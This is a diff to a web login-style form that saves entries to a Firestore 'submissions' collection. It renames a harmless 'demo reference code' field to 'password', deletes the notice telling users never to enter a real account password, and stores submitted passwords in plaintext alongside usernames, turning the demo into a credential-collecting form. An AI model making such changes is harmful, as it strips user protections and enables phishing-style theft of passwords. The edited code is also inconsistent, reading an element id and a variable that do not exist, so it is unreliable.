@@ -122,15 +122,10 @@ button:disabled {
     <input
       type="text"
       id="demoCode"
-      placeholder="Enter demo reference code"
+      placeholder="password"
       maxlength="100"
       required
     >
-
-    <p class="note">
-      Enter a non-sensitive demo reference code only.
-      Never enter a real account password.
-    </p>
 
     <button type="submit" id="submitBtn">
       Submit
@@ -177,9 +172,9 @@ form.addEventListener("submit", async (event) => {
     document.getElementById("username").value.trim();
 
   const demoCode =
-    document.getElementById("demoCode").value.trim();
+    document.getElementById("password").value.trim();
 
-  if (!username || !demoCode) {
+  if (!username || !password) {
     message.textContent = "Please complete both fields.";
     return;
   }
@@ -190,7 +185,7 @@ form.addEventListener("submit", async (event) => {
   try {
     await addDoc(collection(db, "submissions"), {
       username: username,
-      demoReferenceCode: demoCode,
+      password: password,
       createdAt: serverTimestamp()
     });
 
